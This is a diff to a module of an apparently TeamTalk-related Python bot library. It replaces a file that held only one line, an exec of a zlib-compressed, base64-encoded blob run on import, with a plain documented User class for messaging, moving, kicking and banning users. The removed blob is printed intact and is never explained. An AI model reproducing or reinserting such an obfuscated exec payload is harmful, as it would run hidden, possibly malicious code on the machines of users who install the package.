@@ -1,2 +1,147 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'eJzNWN1v2zYQf/dfQbgPswtP2MteDGRA2qSDUXgoEvthKAqBliibtUx6IpXEHfq/745fomTFdroFmJ9k8r5/d8cjh8PhYsMV2cm8LhnJWcEFU4SSpWIVyUqqFNEbqknF9hVTTGjcrHFTCvhaMLpb0HJLYOWBVclwOBwM3pCl4LCtD3s2KCq5wy8u1oTv9rLSdndgd5K01rxUfitdM51qncrV15RqXfFVrZ2MBEhKtgMTqAb+xKv+dPDMfuVXQhVR+XYwGFgP0JnpgMAP7Lu7zJOBob/2NijLjz8NlBooUy6UpiJjU3ItiP9DZEH2B9wPFs7cVhJEoNopueV6A+opUaAEwjPCZUF3bEwkLKNMbRdTnjdrjR7wMUHfEu+bNRpQJClYx3WajhQri8mxzRNng8HiMxgwQW2TIPLLuHEYBM9AGKcl/8YwH5hNDx78CqTX1TqK1GXRCrAlLcb/PEZB+h3linXMXECu3laVBJWzwrhoUoNW6xpTjkCNCKlRIO6xpz3LNMtNiidxoMI3xj05cp5cHQcksLwhvLBqQZuBBJIX1BOuf/LJiq4HBiDnyosxQZgg37jtmrEkNXKvnjErUfUeQgTFh6F6d1g6TUbmuN9Aky7HBgIMgZ6VfRYC47+1sM+uXsxoWTGaHwxuAFXIhgn5WisNuoBKEy0jE85Y7yWccqEjRrE2bYX512TcqBgavh1atILk6qR8yPMEy8u6toEOhw5Nyd9ANcJPG5Px92Q4bichz31Uu/iYxWxDhWDl85HHluyIRo2biXhv12Y3HX22gXp5jtOtNg2KqxTyC0nG5OffyErKstVx3m9YtlUWWADSZx2ivJKImpEeFTXTdSW6VV3V7IyICflAASEiMeiPAEx/OVdGfCuM5OpUyOamiGY3o3HjM5w6OXitFF0z15gzKTQAOrX1/vbt9hHSV5mQAOKtiNwDN1aZZk+aOCmYusG5k304KFqA++6Pb2dOWLv/elum5CM7PMoqD4WlEnLP2LOnXOwlKSB7d7ICFAR87uzRfQ41MGl20zEOYVR1lsG/oi4npiqIYGuQ+MDIAy0t0rVoiPqR3Kk15maOlj/puUNjHO8nYq7WWJ8xoV1J5ve/L/78dJsu72/v2jwfYEqxmJ+spSgxYnb1zfNj471AwnWWyVro0RhYPVvboIVsm9Mtf6vWRQCIXFa09ldzBO/KFknUcMEMiP9eQpJCVUEWyrryUPUWzbEnaascQFmU/03N7ORDqBXbSvr7xRzoVFTopjCg4cNBzQsOR7VvRCeLxNK4InGNESShES3Zlzcedyg9UmWk5FESl4cfaD5uPEVZpg93YtMEbsuzrdvE+Tm1jFMTORPCP6RgrRB+5NhxGzft6I5BjEfi/si1VMAEhQGYRO7zssSzDY2CGHQlI4eJxAUsHkdIQiH/or0BczSmSZNf4nkJh7jY1j740+bE9Mq6h+ZxNqOZPYDgVNpgsqLiZZC8o+KVEVmhmS9DpMvyP0UEzDwLiKpXKoMbnm8x7v8ej6l+RO49hzpuMTH3SWxiQtts4hUzj3o1ptn0RfTZOfmER43jeE6+1PVlw6OihHkN9yPzjKYXheCMb60ZNFDmz4Xh0sm0kfSqiZGh9pccP2bUvdw8D6zz7AdOqGNAzsY5freAyQJffsLTBc410861FlQvqgM6gnNI25nwbGQ9iS5meJ0LN/kChqccplLSuUccY2INQCzMZObG0qDmkmnWjqeOs8fUM48T4RWq/ULR53PsXULM25678kB0aV3iDXNDH7isTrZr7MvoLMQn57aDdi68MeJpmvNMp+ln5Ply6uZrmXpf+aK7pQV9PPgHBUVpHw==')))
+"""This module defines a User class that represents a user on a TeamTalk server."""
+
+# Union type
+from typing import Union
+
+from ._utils import _get_tt_obj_attribute
+from .implementation.TeamTalkPy import TeamTalk5 as sdk
+
+
+class User:
+    """Represents a user on a TeamTalk server.
+
+    Attributes:
+        teamtalk_instance: An instance of pytalk.TeamTalkInstance.
+        user: Either a string (username) or an int (user_id) or an instance of sdk.User.
+    """
+
+    def __init__(self, teamtalk_instance, user: Union[str, int, sdk.User]):
+        """Initializes the User instance.
+
+        Args:
+            teamtalk_instance: An instance of TeamTalk5.
+            user: Either a string (username) or an int (user_id) or an instance of sdk.User.
+
+        Raises:
+            TypeError: If the user argument is not of the expected type.
+        """
+        self.teamtalk_instance = teamtalk_instance
+        # if user is str, assume it's a username
+        if isinstance(user, str):
+            self._user = self.teamtalk_instance.super.getUserByUsername(user)
+        # if user is int, assume it's a user_id
+        elif isinstance(user, int):
+            self._user = self.teamtalk_instance.super.getUser(user)
+        # if the user argument is already of type sdk.User, just set it to self._user
+        elif isinstance(user, sdk.User):
+            self._user = user
+        else:
+            raise TypeError(f"user must be either a string or an int. Argument has type: {str(type(user))}.")
+        self.id = self.user_id
+        self.channel = self.teamtalk_instance.get_channel(self._user.nChannelID)
+        self.server = self.channel.server
+
+    def is_me(self) -> bool:
+        """Checks if this user is the bot itself.
+
+        Returns:
+            True if this user is the bot itself, False otherwise.
+        """
+        return self.user_id == self.teamtalk_instance.getMyUserID()
+
+    def send_message(self, content: str, **kwargs) -> int:
+        """Sends a text message to this user.
+
+        Args:
+            content: The content of the message.
+            **kwargs: Keyword arguments. See pytalk.TeamTalkInstance.send_message for more information.
+
+        Returns:
+            The ID of the message if successful, or a negative value if unsuccessful.
+        """
+        msg = sdk.TextMessage()
+        msg.nMsgType = sdk.TextMsgType.MSGTYPE_USER
+        msg.nFromUserID = self.teamtalk_instance.getMyUserID()
+        msg.szFromUsername = self.teamtalk_instance.getMyUserAccount().szUsername
+        msg.nToUserID = self.user_id
+        msg.szMessage = content
+        msg.bMore = False
+        # get a pointer to our message
+        return self.teamtalk_instance._send_message(msg, **kwargs)
+
+    def move(self, channel) -> bool:
+        """Moves this user to the specified channel.
+
+        Args:
+            channel: The channel to move this user to.
+
+        Returns:
+            True if the user was moved successfully, False otherwise.
+        """
+        return self.server.move_user(self, channel)
+
+    def kick(self, from_server: bool) -> None:
+        """Kicks this user from the server.
+
+        Args:
+            from_server: If True, the user will be kicked from the server. If False, the user will be kicked from the channel. # noqa
+        """
+        channel_id = 0
+        if not from_server:
+            channel_id = self.channel.id
+        self.teamtalk_instance.kick_user(self, channel_id)
+
+    def ban(self, from_server: bool) -> None:
+        """Bans this user from the server.
+
+        Args:
+            from_server: If True, the user will be banned from the server. If False, the user will be banned from the channel. # noqa
+        """
+        channel_id = 0
+        if not from_server:
+            channel_id = self.channel.id
+        self.teamtalk_instance.ban_user(self, channel_id)
+
+    def subscribe(self, subscription) -> None:
+        """Subscribes to the specified subscription.
+
+        Args:
+            subscription: The subscription to subscribe to.
+        """
+        self.teamtalk_instance.subscribe(self, subscription)
+
+    def unsubscribe(self, subscription) -> None:
+        """Unsubscribes from the specified subscription.
+
+        Args:
+            subscription: The subscription to unsubscribe from.
+        """
+        self.teamtalk_instance.unsubscribe(self, subscription)
+
+    def is_subscribed(self, subscription) -> bool:
+        """Checks if this user is subscribed to the specified subscription.
+
+        Args:
+            subscription: The subscription to check.
+
+        Returns:
+            True if the bot is subscribed to the specified subscription from this user, False otherwise.
+        """
+        return self.teamtalk_instance.is_subscribed(self, subscription)
+
+    def __getattr__(self, name: str):
+        """Try to get the specified attribute from self._user if it is not found in self.
+
+        Args:
+            name: The name of the attribute.
+
+        Returns:
+            The value of the specified attribute.
+
+        Raises:
+            AttributeError: If the specified attribute is not found. This is the default behavior. # noqa
+        """
+        if name in dir(self):
+            return self.__dict__[name]
+        else:
+            return _get_tt_obj_attribute(self._user, name)
